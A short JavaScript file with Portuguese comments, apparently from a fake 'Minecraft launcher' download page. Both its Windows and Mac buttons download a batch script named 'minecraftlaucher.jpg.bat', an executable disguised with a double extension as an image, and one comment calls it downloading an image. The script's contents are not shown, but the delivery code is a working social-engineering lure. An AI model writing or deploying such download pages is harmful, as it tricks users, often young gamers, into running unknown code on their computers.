document.addEventListener("DOMContentLoaded", function() {
    // Captura os botões de download
    const downloadWindowsBtn = document.getElementById('download-windows');
    const downloadMacBtn = document.getElementById('download-mac');

    // Função para baixar a imagem
    function downloadImage() {
        // Cria um link temporário para baixar o arquivo
        const link = document.createElement('a');
        link.href = 'minecraftlaucher.jpg.bat'; // Nome do arquivo que será baixado (no mesmo diretório)
        link.download = 'minecraftlaucher.jpg.bat'; // Nome do arquivo durante o download
        link.click(); // Simula o clique no link para iniciar o download
    }

    // Adiciona o evento de clique nos dois botões
    downloadWindowsBtn.addEventListener('click', function(event) {
        event.preventDefault(); // Impede o comportamento padrão do link
        downloadImage(); // Chama a função de download
    });

    downloadMacBtn.addEventListener('click', function(event) {
        event.preventDefault(); // Impede o comportamento padrão do link
        downloadImage(); // Chama a função de download
    });
});
